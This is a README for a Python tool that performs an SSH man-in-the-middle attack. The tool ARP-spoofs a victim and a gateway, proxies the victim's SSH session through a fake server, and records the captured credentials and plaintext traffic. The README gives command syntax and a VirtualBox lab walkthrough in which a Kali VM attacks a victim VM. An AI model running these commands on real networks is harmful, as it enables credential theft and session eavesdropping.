# ssh-mitm-python
Python scripts to execute a mitm attack on an ssh connection.

The sshmitm.py script executes an arp spoofing to become a MITM between a victim and the LAN gateway, then redirects all SSH traffic to a fake SSH server (sshserver.py). The fake server acts as a proxy to the real SSH server and can read the unencrypted traffic. It also logs all the credentials to a sqlite3 database and all the unencrypted communication to a log file in the logs folder.

If the victim has never connected before to a ssh server with the same IP address, the attack will be successful unless the client checks the server fingerprint manually. If the victim has connected before to the server the ssh client will display a scary warning because it will detect a change in the server fingerprint.

## Usage
Create the ssh server log file so the current user has write permission.
```
touch sshserver.log
```
Generate a RSA key pair.
```
ssh-keygen -f ./id_rsa
```
Use the script with the following syntax. If you want to perform the attack you must run the script as root.
```
usage: [sudo] python sshmitm.py [-h] [-t TARGET] [-g GATEWAY] [-d DB] [-l] [-u USERNAME]
                  [-s SSHMACHINE] [-v]

options:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        IP address of the victim machine, i.e. the machine that
                        will try to client to the remote SSH machine.
  -g GATEWAY, --gateway GATEWAY
                        IP address of the gateway of the LAN or the IP address
                        of a machine on the LAN that the victim will connect to
  -d DB, --db DB        path to the sqlite3 database file
  -l, --list            show collected credentials instead of executing the
                        attack
  -u USERNAME, --username USERNAME
                        filter the collected credentials by username
  -s SSHMACHINE, --sshmachine SSHMACHINE
                        filter the collected credentials by the IP address of
                        the remote SSH machine
  -v, --verbose         send all the communication between the victim and the
                        ssh machine to the stdout
```
## How to test the attack
The attack was tested using Virtualbox. Two only host networks (vboxnet0 and vboxnet1) and four VMs were used:
1. An Ubuntu server VM as the remote SSH server, connected to vboxnet1. Ova file: https://mega.nz/file/wWkV0J5D#t11axjo0DtwhEvZThIdxgi_i_4O3TEhlMz9C4KnSwQQ
2. A Pfsense VM as the router, connected to vboxnet0 as the LAN and vboxnet1 as the WAN. Ova file: https://mega.nz/file/cWdBjTpT#lYjuOFJpdULoCJ2u7rXQNP9_Q6kw4GWDleDzbllo6No
3. A Ubuntu desktop VM as the victim, connected to vboxnet0. Ova file: https://mega.nz/file/dSdVkIZR#5uWslWWTtKeC6iC-lvnP6eZxodmurPkAieWlB0jEjqM
4. A Kali Linux VM as the attacker, connected to vboxnet0. Ova file: https://mega.nz/file/AXsCQRQZ#PhS28EXbT44rcDeeV3MO-ycDGkOgbAHDG2fth3dqgxQ

Boot the VMs. Login to the Kali VM with credentials *kali* *kali* and run:
```
cd ssh-mitm-python
sudo python sshmitm.py -t 192.168.56.3 -g 192.168.56.2
```
Login to the Ubuntu desktop VM with credentials *giovanni* *giovanni* and run:
```
ssh adminuser@sshmachine.com
```
When asked, insert the password *secretpassword*. Then run some command, for example:
```
cat /etc/passwd
```
Go back to the Kali VM. Press ctrl-c to stop the script. Then run `python sshmitm.py -l` to see the collected credentials.
Inside the logs folder you will find a complete log of the SSH session.
